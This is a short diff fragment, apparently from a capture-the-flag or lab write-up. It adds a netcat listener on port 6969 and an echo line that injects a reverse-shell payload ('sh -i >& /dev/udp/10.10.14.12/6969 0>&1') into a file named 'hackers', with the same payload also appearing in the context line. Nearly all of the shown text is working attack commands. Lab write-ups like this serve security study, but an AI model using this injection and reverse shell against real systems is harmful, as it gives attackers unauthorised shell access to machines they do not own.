@@ -62,6 +62,18 @@ echo "ignore ignore ;"sh -i >& /dev/udp/10.10.14.12/6969 0>&1"" >> hackers
 
 
 
+hippoeug@kali:~$ nc -lvnp 6969
+listening on [any] 6969 ...
+
+
+
+echo "ignore ignore ';sh -i >& /dev/udp/10.10.14.12/6969 0>&1'" >> hackers
+
+
+
+
+
+
 
 
 =================
